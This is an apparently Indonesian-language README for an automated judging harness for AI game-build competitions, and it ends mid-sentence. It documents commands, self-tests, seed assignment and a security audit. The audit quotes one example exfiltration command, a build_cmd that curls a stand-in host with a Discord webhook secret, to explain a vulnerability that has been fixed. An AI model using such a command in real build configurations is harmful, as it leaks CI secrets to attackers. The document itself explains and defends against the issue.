# ASSAY harness (Gate A)

Automated judging harness buat ASSAY (AI Pilot Arena) -- BYOT game-build submissions dinilai
otomatis: build -> serve -> browser check -> skor + flag anti-prebuilt.

## Jalanin judge

```
npm run judge -- --submission <dir> --participant <id> --brief <brief-id> --seed '<json>' --track <casual|competitive|final>
```

Optional: `--division`, `--out`, `--t0`, `--repoCreatedAt`.

Brief yang tersedia (`briefs/`): `01-endless-runner`, `02-platformer-gravity-flip`,
`03-memory-reshuffle`, `10-idle-clicker-prestige`.

**Windows/PowerShell**: `npm run judge` lewat npm.cmd bikin PowerShell rewrite argumen
yang ada `"` di dalamnya (kejadian nyata, bukan hipotetis). Pakai stop-parsing token:

```powershell
npm run judge -- --% --submission .\sub --participant x --brief 01-endless-runner --seed "{\"theme\":\"contoh\"}" --track casual
```

## Self-test (bukti, bukan klaim)

```
npm run test:unit    # pure Node, gak butuh browser -- aggregate() + spearman() math
npm run selftest     # jalanin harness beneran lewat browser lawan 3 fixture publik
npm run spearman     # sama fixture, tapi assert URUTAN skor match urutan kualitas (ranking validity)
```

`npm run selftest` beneran jalanin harness lawan 3 fixture publik (auto-clone kalau belum
ada lokal): `assay-sample-good`, `assay-dummy-jelek`, `assay-dummy-curang`. Assert pola:

| Fixture | Ekspektasi |
|---|---|
| good | score 100, tanpa flag, `ratable: true` |
| jelek | score turun (bug fungsional nyata: restart gak reset, skor macet) tapi TIDAK kena `SEED_MISMATCH`, tetap `ratable: true` |
| curang | kena flag `SEED_MISMATCH(prebuilt?)`, `ratable: false`, dan **score HARUS lebih rendah dari jelek** (invarian integritas -- lihat "Fix 2026-07-11" di bawah) |

`npm run spearman` menghitung Spearman rank correlation (`src/score/spearman.ts`) antara
skor harness dan urutan kualitas yang disepakati manusia (good > jelek > curang). Assert
`rho === 1`. Ini regression guard buat "apakah ranking-nya bener", bukan bukti akurasi
statistik -- n=3 kekecilan buat itu (lihat Known gaps).

Kalau script-script ini gak ada di `package.json` atau file test-nya gak ke-commit --
JANGAN percaya klaim "Gate A closed" di dokumen manapun sampai lo jalanin sendiri dan cek
exit code-nya.

```
npm run selftest:briefs        # brief 02/03/10 lawan fixtures/multi-* LOKAL (belum di-push kemana2)
npm run verify-fixtures-jsdom  # sanity check cepat (jsdom, BUKAN Playwright asli) buat fixture di atas
```

## Seed assignment buat event beneran (bukan pool statis lagi)

```
npm run assign-seeds -- --brief 01-endless-runner --participants participants.txt --salt "rahasia-jam1" --out out/seeds.json
```

`config/seed_pool.json` (4-6 entri) HANYA buat contoh/dev lokal. Assignment beneran pakai
`config/seed_space.json` (ratusan-ribuan kombinasi per brief, lihat `src/seed/space.ts` +
`src/seed/assign.ts`) -- collision-free DIJAMIN dalam 1 event (bukan cuma "kemungkinan
kecil"), lewat hash(participant+salt) + open-addressing. Salt WAJIB dirahasiain sampai
window mulai (lihat "Live event ops" di bawah).

## Live event: orkestrasi + rating

```
npm run tournament -- --owner <gh-owner> --repo assay --roster out/roster.json --seeds out/seeds.json --brief 01-endless-runner
npm run elo-round -- --brief 01-endless-runner --roster out/roster.json --salt "rahasia-round1" --out out/round_pairs.json
npm run elo-apply -- --pairs out/round_pairs.json --results out/_tournament/results.json
```

`scripts/run_tournament.ts` -- trigger + poll N judge run lewat GitHub Actions REST API
(gantiin klik manual `workflow_dispatch` satu-satu), tarik `score.json` dari tiap
artifact, cetak leaderboard. Butuh `GH_TOKEN` env var (PAT scope `repo`+`workflow`).
**BELUM PERNAH DITES LAWAN GITHUB BENERAN** (sandbox yang nulis ini nggak punya token) --
coba dulu lawan 2-3 peserta dummy sebelum dipercaya buat 50 peserta beneran.

`src/elo/*` -- rating competitive track, HARNESS-ONLY (nol human judge). Detail formula,
K-factor, draw margin, forfeit rule ada di "Rating (ELO) -- competitive track" di bawah.

## Fix 2026-07-11 (audit sesi ini -- 3 masalah nyata, semua sudah diperbaiki + ada test)

1. **Secret exfiltration lewat `build_cmd`.** `build_cmd` di `arena.json` dikontrol
   PENUH oleh peserta dan sebelumnya dijalankan lewat `execSync` yang inherit
   `process.env` -- artinya `LLM_API_KEY`/`DISCORD_WEBHOOK` di job CI bisa dicuri
   cukup dengan `build_cmd: "curl evil.com?d=$DISCORD_WEBHOOK"`. Fix: (a)
   `src/util.ts` nambah `shUntrusted()` yang strip env ke minimal (PATH/HOME doang)
   buat semua command yang datang dari manifest peserta, dipakai di
   `src/gates/build.ts`; (b) `.github/workflows/judge.yml` dipecah jadi 2 job --
   `judge` (jalanin code peserta, NOL secret) dan `notify` (pegang
   `DISCORD_WEBHOOK`, cuma baca `score.json` yang udah jadi, gak pernah eksekusi
   apapun dari repo peserta). Isolasi di level infra (VM terpisah), bukan cuma
   strip env di level proses. `LLM_API_KEY` juga dihapus dari workflow karena
   0 match penggunaan di `src/` -- exposure tanpa fungsi.
2. **Cheat bisa outrank submission jujur.** Sebelumnya `spec_seed` = rata-rata biasa
   dari SEMUA check (fungsional + seed) -- jadi 1 seed-check gagal cuma nyenggol
   skor beberapa persen kalau briefnya punya banyak check lain. Bukti nyata:
   fixture `curang` (cheat, `SEED_MISMATCH`) skor **92**, fixture `jelek` (jujur,
   ada bug beneran) skor **84** -- cheat menang. Fix: `src/cli.ts` sekarang
   ngitung `spec_seed = nonSeedPassFraction * seedPassFraction` (perkalian, bukan
   rata-rata) -- seed gagal total collapse komponen ke 0, proporsional kalau brief
   ke depan punya >1 seed-check. Submission apapun yang `SEED_FAIL` juga
   ditandain `ratable: false` di `JudgeResult` -- eksplisit gak boleh dipakai buat
   hitung rating sampai direview manusia. `tests/selftest.ts` sekarang assert
   `curang.score < jelek.score` sebagai invarian keras, bukan cuma cek flag ada.
3. **Klaim "track renormalization belum fixed" di README lama itu SENDIRI sudah
   basi** -- commit `e24da9c` udah benerin bug cap ~70/60 itu, tapi README
   sebelumnya masih bilang belum. Dibuktikan lewat `npm run test:unit`
   (`tests/aggregate.unit.ts`), bukan diklaim ulang doang.

## Live event ops -- seed privacy & salt (jawaban buat "submission private sampe window ditutup")

`judge.yml` nge-`git clone` repo peserta TANPA auth -- artinya repo peserta WAJIB publik
biar bisa di-clone. Konsekuensinya: repo itu bisa dibuka SIAPA AJA, KAPAN AJA, termasuk
peserta lain, SELAMA window masih jalan (bukan cuma setelah selesai). Kalau 2 peserta
kebetulan dapet seed yang identik, salah satu bisa buka repo publik yang lain, liat
seed-nya cocok, dan copy implementasinya mentah-mentah -- harness gak bisa bedain "nulis
sendiri" vs "nyalin karena kebetulan seed sama".

Fix di sesi ini ADA di kode (`config/seed_space.json` + `src/seed/assign.ts` -- cardinality
gede + collision-free-by-construction), tapi itu cuma ngilangin risiko "seed sama". Risiko
LAIN yang independen dari collision: peserta bisa liat *pendekatan/kode* peserta lain (studi
gaya, bukan verbatim-copy) selagi window masih jalan, walau seed beda. Itu bukan sesuatu
yang bisa di-fix di level kode -- pilihannya proses:
- **Salt rahasia** (udah diimplementasi): jangan umumin `--salt` ke `assign-seeds`/`run_elo_round`
  sebelum window mulai. Peserta gak bisa precompute/prebuild seed spesifik sebelum tau
  saltnya, walau mereka lomba bikin script tebak-tebakan.
- **Window pendek**: makin pendek waktu antara "seed diumumin" dan "submission ditutup",
  makin kecil peluang orang sempat browsing+niru repo orang lain secara efekt